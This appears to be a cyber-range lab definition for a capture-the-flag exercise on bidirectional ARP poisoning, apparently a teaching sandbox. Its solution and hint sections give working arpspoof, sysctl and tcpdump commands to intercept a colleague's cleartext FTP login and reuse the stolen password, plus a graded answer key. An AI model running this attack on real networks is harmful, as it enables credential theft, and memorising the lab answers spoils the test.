title: CR-18 / Module 3 / N3b — Intermediate ARP Poisoning
description: A host on the LAN keeps logging in to an FTP server in cleartext. Sit between the two of them, harvest the credentials, then log in yourself and lift the flag.
prerequisites: CR-18 / N3a or equivalent experience with ARP poisoning
Recognise plaintext protocols on the wire
outcomes: Perform a bidirectional ARP poisoning attack between two hosts
Forward intercepted traffic and read plaintext credentials from FTP
Reuse captured credentials against a real service

levels.title: Briefing
levels.content:
## Scenario

A small office LAN. Three machines on it:

- **vm1** at `192.168.25.10` runs an FTP server.
- **vm2** at `192.168.25.20` is a user workstation. Someone here has scripted a periodic FTP login to vm1 and never noticed that FTP credentials cross the wire in cleartext.
- **vma** at `192.168.25.30` is your attacker workstation.

## What you will do

1. Get on the path between vm1 and vm2 by poisoning the ARP caches on both ends.
2. Forward the traffic so the FTP session still completes (otherwise vm2 will notice).
3. Read the username and password off the wire.
4. Log in to the FTP server yourself with those credentials and download the flag.

Submit the flag verbatim as you read it.

levels.title: Get Access
levels.cloud_content:
Open the Kali desktop on **vma** and log in.

1. In the topology overview on the right, right-click on **`vma`** and choose **`Open GUI`** (or **`Open GUI In New Window`** if you prefer a separate window). The Kali display manager loads in your browser.
2. Log in with username **`user`** and password **`Password123`**.
3. Open a terminal from the desktop.

SSH is documented at https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access if you prefer.

When you are in, submit **`start`** to unlock the next level.
levels.local_content: This sandbox has not been validated for local-only deployment.

levels.title: Background — bidirectional MITM and plaintext protocols
levels.content:
In N3a you claimed an IP nobody owned — easy case, no competing replies, one-way spoof. Here both endpoints (vm1 and vm2) are real and actively talking. You need to sit *between* them without breaking the conversation. That changes a few things.

## Bidirectional ARP poisoning

For a working MITM you have to lie to **both** sides:

- vm1 must think *"vm2 is at vma's MAC"* → frames vm1 → vm2 land on you
- vm2 must think *"vm1 is at vma's MAC"* → frames vm2 → vm1 land on you

That's two separate `arpspoof` processes running simultaneously. Together they form a full duplex MITM.

## IP forwarding

Once both sides send their frames to you, your kernel's IP stack will drop them — they're destined for IPs you don't own. The session breaks; both endpoints see their packets disappearing into the void.

The fix: tell the kernel to act as a router. Forward unowned packets out toward their real destination.

   `sudo sysctl -w net.ipv4.ip_forward=1`

Now your kernel relays. vm1 ↔ vm2 still works, just routed through you. You sniff in the middle.

## The classic pitfall: ICMP redirects

Linux has a feature called **ICMP Redirect**. When the kernel forwards a packet between two hosts on the same subnet, it helpfully tells the sender *"you don't need me, go direct to that host"*. The sender then re-ARPs the destination, the real ARP reply wins this time, and your MITM falls apart within seconds.

Disable it before you start spoofing:

   `sudo sysctl -w net.ipv4.conf.all.send_redirects=0`

   `sudo sysctl -w net.ipv4.conf.eth1.send_redirects=0`

This is the single most common reason a textbook ARP MITM doesn't work in practice. The spoof appears to be active, then mysteriously stops capturing traffic after a few seconds.

## Why FTP is the natural target

The File Transfer Protocol (RFC 959, 1985) sends usernames and passwords in **plain ASCII** on its control channel (tcp/21). Once you're between vm1 and vm2 with traffic flowing through you, capturing the `USER ...` and `PASS ...` lines is a Wireshark filter and a *Follow → TCP Stream* away. There's no encryption to break, no hash to crack, no challenge-response to replay. The credentials cross the wire as readable English.

The same is true of telnet, plain SMTP, HTTP, IMAP, POP3 — most clear-text protocols from the pre-TLS era. Modern stacks favor encrypted alternatives (SFTP, SSH, SMTPS, HTTPS, IMAPS, POP3S) but FTP servers still show up in legacy environments. Recognising what protocols are plaintext on sight is half the skill of being useful inside a compromised LAN.

## What you'll do in the next two levels

Level 3: get on the path with bidirectional ARP poisoning + IP forwarding, capture vm2's plaintext FTP password.

Level 4: use the captured credentials to log in to the FTP server yourself and download the flag.

levels.title: Capture the password
levels.content:
From **vma**, intercept vm2's FTP session to vm1 and read the password off the wire.

The trick is that you need to be on the *path* between them, not just listening. ARP poisoning gets you there: tell vm1 that vm2 is at your MAC, tell vm2 that vm1 is at your MAC, and enable IP forwarding so the session keeps flowing.

Submit the password vm2 sends with the FTP `PASS` command.
levels.solution:
1. **Set up your capture.** Pick the LAN interface (`ip -br addr` will show it; on Kali it is usually `eth1`).

   Wireshark is the easiest tool here because FTP control commands sit cleanly in TCP payloads and the GUI filter strips out the noise. Make sure you select **`eth1`** as the capture interface (the platform's mgmt VNC + WAN traffic will otherwise drown out the lab traffic). Apply display filter:

   `tcp.port == 21`

   If you still see noise from the platform's management plane, a broader filter is:

   `not vnc and not (ip.src == 10.10.10.0/24 or ip.dst == 10.10.10.0/24)`

   At this point you should see nothing of vm2's FTP session, because it is point-to-point between vm1 and vm2 and you are not on the path.

2. **Enable IP forwarding and disable ICMP redirects** so the kernel keeps packets flowing through you instead of telling vm2 to bypass you:

   `sudo sysctl -w net.ipv4.ip_forward=1`

   `sudo sysctl -w net.ipv4.conf.all.send_redirects=0`

   `sudo sysctl -w net.ipv4.conf.eth1.send_redirects=0`

   Without the `send_redirects=0` lines, your kernel sees you forwarding between two hosts on the same subnet and helpfully ICMP-redirects the sender to go direct, which triggers a fresh ARP and unpoisons the cache.

3. **Poison both ARP caches.** Two terminals with `arpspoof`:

   `sudo arpspoof -i eth1 -t 192.168.25.10 192.168.25.20`

   `sudo arpspoof -i eth1 -t 192.168.25.20 192.168.25.10`

   First line tells vm1 that vm2 is at your MAC. Second line tells vm2 that vm1 is at your MAC. The session now hairpins through you.

   (`bettercap`'s `arp.spoof` module is the popular alternative, but its model is built for victim ↔ gateway MITM, not client ↔ client. Setting `arp.spoof.targets 192.168.25.10,192.168.25.20` makes it spoof both about the auto-detected gateway, which produces honest gratuitous ARPs from vma and poisons nothing. Stick with `arpspoof` for this scenario.)

4. **Wait for the next FTP cycle (≤15 seconds) and read the password off Wireshark.** Right-click any tcp/21 packet and choose **Follow → TCP Stream** to see the full FTP conversation as plain text. You will see:

   ```
   USER ${ftp_user}
   PASS ${ANSWER}
   ```

   (If you prefer terminal: `sudo tcpdump -ni eth1 -A 'tcp port 21' | grep --line-buffered -E 'USER |PASS '` will do the same with much less noise than plain `-A`.)

5. Submit **`${ANSWER}`** as the password.

Keep arpspoof running for the next level. You will need to log in to FTP yourself.

hints.title: MITM, not just sniffing
hints.content: If you only run tcpdump without ARP spoofing first, you will see nothing of vm2's session. It is a unicast between two other machines on the segment. You need to lie about the MAC addresses so the traffic actually traverses you.

hints.title: Spoof both directions
hints.content: ARP poisoning needs to point both endpoints at you. With `arpspoof`, that is two simultaneous processes (one per direction). `bettercap` is built for victim ↔ gateway MITM, not victim ↔ victim, so its `arp.spoof` won't help you in this scenario — `arpspoof` is the right tool.

hints.title: Don't black-hole the traffic and don't tip off the victim
hints.content: Without IP forwarding (`sudo sysctl -w net.ipv4.ip_forward=1`), packets arrive at your kernel and stop — session breaks, vm2 retries, you learn nothing. And without `sudo sysctl -w net.ipv4.conf.all.send_redirects=0`, your kernel ICMP-redirects vm2 to go direct because it sees both hosts on the same subnet, which triggers a fresh ARP and unpoisons the cache within seconds. Set both before you start spoofing.

levels.title: Read the flag
levels.content:
You have the password. Now log in to the FTP server yourself and retrieve the flag.

The flag lives in a file called `flag.txt` in the FTP user's home directory. Submit the file contents verbatim.

You may stop the arpspoof processes now if you want; you no longer need the MITM.
levels.solution:
1. The username you saw on the wire was **${ftp_user}**. Connect to vm1 with a real FTP client:

   `ftp 192.168.25.10`

   It will prompt for a name and password. Use **${ftp_user}** and the password you captured.

2. List the home directory:

   `ls`

   You should see `flag.txt`.

3. Download it:

   `get flag.txt`

   The file lands in your current working directory on vma. Quit with `bye`.

4. Read it:

   `cat flag.txt`

   Submit the contents as-is: **`${ANSWER}`**.

hints.title: Use a real FTP client
hints.content: The `ftp` command-line tool is the simplest option. It prompts for the username and password, then drops you into a shell where `ls`, `get`, and `bye` work as you'd expect.

hints.title: The flag file is named flag.txt
hints.content: After logging in, `ls` in the FTP session will show `flag.txt`. Use `get flag.txt` to download it. Read it locally on vma with `cat`.
